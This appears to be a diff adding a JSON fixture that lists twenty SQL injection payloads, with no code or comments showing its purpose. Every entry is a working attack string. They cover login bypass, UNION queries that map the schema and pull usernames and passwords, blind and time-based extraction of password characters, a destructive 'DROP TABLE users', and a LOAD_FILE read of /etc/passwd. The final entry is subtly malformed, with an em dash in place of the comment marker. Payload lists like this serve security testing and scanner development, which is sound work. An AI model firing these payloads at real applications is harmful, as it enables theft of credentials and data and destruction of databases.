@@ -1,0 +1,82 @@
+[
+    {
+        "id": 1,
+        "payload": "' OR 1=1--"
+    },
+    {
+        "id": 2,
+        "payload": "' OR '1'='1"
+    },
+    {
+        "id": 3,
+        "payload": "' UNION SELECT null, null--"
+    },
+    {
+        "id": 4,
+        "payload": "' UNION SELECT 1, @@version--"
+    },
+    {
+        "id": 5,
+        "payload": "' UNION SELECT 1, table_name FROM information_schema.tables--"
+    },
+    {
+        "id": 6,
+        "payload": "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--"
+    },
+    {
+        "id": 7,
+        "payload": "' UNION SELECT username, password FROM users--"
+    },
+    {
+        "id": 8,
+        "payload": "' AND SLEEP(5)--"
+    },
+    {
+        "id": 9,
+        "payload": "'; DROP TABLE users--"
+    },
+    {
+        "id": 10,
+        "payload": "' OR 1=1 LIMIT 1--"
+    },
+    {
+        "id": 11,
+        "payload": "' ORDER BY 1--"
+    },
+    {
+        "id": 12,
+        "payload": "' ORDER BY 3--"
+    },
+    {
+        "id": 13,
+        "payload": "' AND (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+        "id": 14,
+        "payload": "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--"
+    },
+    {
+        "id": 15,
+        "payload": "' UNION SELECT 1, LOAD_FILE('/etc/passwd')--"
+    },
+    {
+        "id": 16,
+        "payload": "' UNION SELECT 1, user()--"
+    },
+    {
+        "id": 17,
+        "payload": "' UNION SELECT 1, database()--"
+    },
+    {
+        "id": 18,
+        "payload": "' AND 1=IF(1=1, SLEEP(3), 0)--"
+    },
+    {
+        "id": 19,
+        "payload": "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
+    },
+    {
+        "id": 20,
+        "payload": "' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()—"
+    }
+]
